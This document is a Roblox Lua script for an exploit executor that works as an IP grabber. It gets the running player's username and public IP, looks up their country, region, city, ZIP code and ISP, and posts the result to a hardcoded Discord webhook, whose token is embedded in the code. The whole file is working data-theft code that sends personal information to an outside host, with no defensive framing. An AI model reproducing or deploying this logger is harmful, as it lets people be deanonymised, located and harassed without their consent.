local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local name = player.Name

-- Use Delta's 'request' function
local request = request or http.request or syn.request

-- Step 1: Get Public IP
local success, getIPResponse = pcall(function()
    return request({
        Url = "https://api.ipify.org?format=json",
        Method = "GET"
    })
end)

if not success or not getIPResponse.Success then
    warn("Failed to get IP")
    return
end

local ipData = HttpService:JSONDecode(getIPResponse.Body)
local IP = ipData.ip

-- Step 2: Get IP Info
local success2, ipInfoResponse = pcall(function()
    return request({
        Url = "http://ip-api.com/json/" .. IP,
        Method = "GET"
    })
end)

if not success2 or not ipInfoResponse.Success then
    warn("Failed to get IP info")
    return
end

local info = HttpService:JSONDecode(ipInfoResponse.Body)

-- Step 3: Format Data
local dataMessage = string.format(
    "**User:** %s\n**IP:** %s\n**Country:** %s (%s)\n**Region:** %s\n**City:** %s\n**ZIP:** %s\n**ISP:** %s\n**Org:** %s",
    name,
    IP,
    info.country or "N/A",
    info.countryCode or "N/A",
    info.regionName or "N/A",
    info.city or "N/A",
    info.zip or "N/A",
    info.isp or "N/A",
    info.org or "N/A"
)

-- Step 4: Send to Webhook
local webhookURL = "https://discord.com/api/webhooks/1048338938340843550/2ZNKB3rbE4U5VVqNgLKxQAHVuskDn3I1ySzfy0Z_ngzXNrenblomXbilhEhjNIIqYMrc"

local payload = {
    content = dataMessage
}

local success3, sendResponse = pcall(function()
    return request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success3 and sendResponse.Success then
    print("Successfully sent data to webhook!")
else
    warn("Failed to send to webhook:", sendResponse.StatusCode, sendResponse.StatusMessage)
end
